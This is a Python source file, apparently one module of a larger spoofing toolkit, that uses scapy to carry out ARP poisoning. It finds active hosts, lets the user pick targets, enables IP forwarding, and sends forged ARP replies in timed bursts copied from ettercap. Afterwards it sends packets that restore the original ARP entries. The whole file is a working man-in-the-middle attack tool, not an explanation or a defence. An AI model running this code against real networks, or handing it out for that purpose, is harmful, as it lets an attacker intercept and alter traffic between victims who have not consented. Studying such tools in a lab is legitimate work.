from scapy.all import *
import time

import search_hosts as sh
import spoofing_tool as spoof

## CONSTANTS ##
START_COUNT = 5 # ettercap starts poisoning with 5 packets
MIDDLE_COUNT = 200 #sys.maxint # ettercap keeps poisoning for 200 packets
END_COUNT = 3 # ettercap ends poisoning with 3 packets

START_INTERVAL = 1 # ettercap sends packets every second
MIDDLE_INTERVAL = 20 # ettercap sends packets every 10 seconds
END_INTERVAL = 1 # ettercap sends packets every second

ONE_WAY_TOKEN = "__ONE_WAY_TOKEN__"

def arp_spoofing(gratuitious, verbose):
    if verbose:
        conf.verb = 0

    spoof.clear()
    previous_tuples = []

    # enable ip forwarding
    spoof.should_ip_forward(True)
    previous_tuples.append(["IP forwarding enabled!"])
    previous_tuples.append([""])

    previous_tuples.append(["Chosen attack: ARP Poisoning.", 0])
    previous_tuples.append(["-----------------------------"])

    iface, previous_tuples = spoof.get_interface(previous_tuples)

    spoof.print_previous(previous_tuples, True)

    active_hosts, previous_tuples = sh.search_hosts(iface, [])

    targets, previous_tuples = choose_arp_targets(active_hosts, previous_tuples)

    my_details = sh.get_my_details(iface)
    two_way_arp_procedure(targets, my_details["mac"], my_details["ip"], iface, gratuitious)

def choose_arp_targets(active_hosts, previous_tuples):
    spoof.printf("")
    previous_tuples.append([""])
    spoof.printf("Input number of targets for the attack:", 1)
    previous_tuples.append(["Input number of targets for the attack:", 1])

    num_targets = int(spoof.inputf(previous_tuples))
    previous_tuples.append([str(num_targets), 7])

    if num_targets < 2 or num_targets > len(active_hosts):
        spoof.printf("Invalid number of targets specified! Defaulting to 2.", 2)
        num_targets = 2

    targets = []
    past_ips = []
    for i in range(num_targets):
        spoof.printf("")
        previous_tuples.append([""])

        if i == 0:
            spoof.printf("Input IP address of the first target out of the active hosts:", 1)
            previous_tuples.append(["Input IP address of the first target out of the active hosts:", 1])
        else:
            spoof.printf("Input IP address of the next target out of the active hosts:", 1)
            previous_tuples.append(["Input IP address of the next target out of the active hosts:", 1])
        
        curr_target = spoof.validate_ip(active_hosts, past_ips, previous_tuples)
        previous_tuples.append([curr_target["ip"], 7])

        targets.append((curr_target['mac'], curr_target['ip']))
        past_ips.append(curr_target["ip"])

    return targets, previous_tuples

def two_way_arp_procedure(targets, macAtk, ipAtk, iface, gratuitious):
    spoof.clear()
    spoof.printf("Spoofing the connection between", 0)

    to_print = "\t"
    for i in range(len(targets)):
        if i == len(targets) - 1:
            to_print += targets[i][1]
        elif i == len(targets) - 2:
            to_print += targets[i][1] + " and "
        else:
            to_print += targets[i][1] + ", "
    spoof.printf(to_print)

    spoof.printf("")

    spoof.printf("Starting poisoning... (Use Ctrl+Z to stop and kill the program)", 4)
    poison_m_times_every_n_secs(START_COUNT, START_INTERVAL, time.time() - START_INTERVAL, True, targets, macAtk, ipAtk, iface, 1)

    spoof.printf("Poisoning initiated.", 4)
    poison_m_times_every_n_secs(MIDDLE_COUNT, MIDDLE_INTERVAL, time.time(), True, targets, macAtk, ipAtk, iface, 2, gratuitious)

    spoof.printf("Stopping poisoning!!! (Do not kill the program)", 4)
    poison_m_times_every_n_secs(END_COUNT, END_INTERVAL, time.time() - END_INTERVAL, False, targets, macAtk, ipAtk, iface, 2)

def one_way_arp_start(macT1, ipT1, ipT2, macAtk, ipAtk, iface):
    targets = [(macT1, ipT1), (ONE_WAY_TOKEN, ipT2)]
    poison_m_times_every_n_secs(START_COUNT, START_INTERVAL, time.time() - START_INTERVAL, True, targets, macAtk, ipAtk, iface, 1)

def one_way_arp(macT1, ipT1, ipT2, macAtk, ipAtk, iface, pkt_type, gratuitious):
    targets = [(macT1, ipT1), (ONE_WAY_TOKEN, ipT2)]
    arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious)

def one_way_arp_end(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface):
    targets = [(macT1, ipT1), (macT2, ipT2)]
    poison_m_times_every_n_secs(END_COUNT, END_INTERVAL, time.time() - END_INTERVAL, False, targets, ONE_WAY_TOKEN, ipAtk, iface, 2)

def poison_m_times_every_n_secs(m, n, last_sent_time, should_poison, targets, macAtk, ipAtk, iface, pkt_type, gratuitious=False):
    while m > 0:
        if time.time() - last_sent_time > n:
            if should_poison:
                arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious)
            else:
                arp_unpoison(targets, macAtk, ipAtk, iface, pkt_type)     
            last_sent_time = time.time()
            m -= 1
    
def arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious):
    for i in range(len(targets) - 1):
        for j in range(i + 1, len(targets)):
            macT1 = targets[i][0]
            ipT1  = targets[i][1]            
            macT2 = targets[j][0]
            ipT2  = targets[j][1]

            if macT2 == ONE_WAY_TOKEN:
                send_one_directional(macT1, ipT1, ipT2, macAtk, iface, pkt_type, gratuitious)
            elif macT1 == ONE_WAY_TOKEN:
                send_one_directional(macT2, ipT2, ipT1, macAtk, iface, pkt_type, gratuitious)
            else:
                send_bi_directional(ipT2, macT2, ipT1, macT1, macAtk, macAtk, iface, pkt_type, gratuitious)

def arp_unpoison(targets, macAtk, ipAtk, iface, pkt_type):
    gratuitious = False

    for i in range(len(targets) - 1):
        for j in range(i + 1, len(targets)):
            macT1 = targets[i][0]
            ipT1  = targets[i][1]            
            macT2 = targets[j][0]
            ipT2  = targets[j][1]

            if macAtk == ONE_WAY_TOKEN:
                send_one_directional(macT1, ipT1, ipT2, macT2, iface, pkt_type, gratuitious)
            elif macAtk == ONE_WAY_TOKEN:
                send_one_directional(macT2, ipT2, ipT1, macT1, iface, pkt_type, gratuitious)
            else:
                send_bi_directional(ipT2, macT2, ipT1, macT1, macT2, macT1, iface, pkt_type, gratuitious)    

def send_one_directional(_macT1, _ipT1, _ipT2, _macAtk, _iface, pkt_type, gratuitious):
    # poison ARP table of the target
    arp_t = build_packet(_macAtk, _ipT2, _macT1, _ipT1, pkt_type, gratuitious)

    # send the packet
    sendp(arp_t, iface=_iface)

def send_bi_directional(_ipM2, _macM2, _ipM1, _macM1, _macM31, _macM32, _iface, pkt_type, gratuitious):
    # poison ARP table of T1
    arp_m1 = build_packet(_macM31, _ipM2, _macM1, _ipM1, pkt_type, gratuitious)
    # poison ARP table of T2
    arp_m2 = build_packet(_macM32, _ipM1, _macM2, _ipM2, pkt_type, gratuitious)

    # send the packets
    sendp([arp_m1, arp_m2], iface=_iface)

def build_packet(macAttacker, ipToSpoof, macVictim, ipVictim, pkt_type, gratuitious):
    packet = Ether() / ARP()
    packet[Ether].src = macAttacker
    packet[ARP].hwsrc = macAttacker # Send the MAC address of the attacker
    packet[ARP].psrc  = ipToSpoof   # as the spoofed IP address.

    if gratuitious:
        packet[Ether].dst = "ff:ff:ff:ff:ff:ff"
        packet[ARP].hwdst = "ff:ff:ff:ff:ff:ff"
        packet[ARP].pdst  = ipToSpoof
        packet[ARP].op = 2 # 1 = request, 2 = reply
    else:
        packet[ARP].hwdst = macVictim
        packet[ARP].pdst  = ipVictim
        packet[ARP].op = pkt_type # 1 = request, 2 = reply

    return packet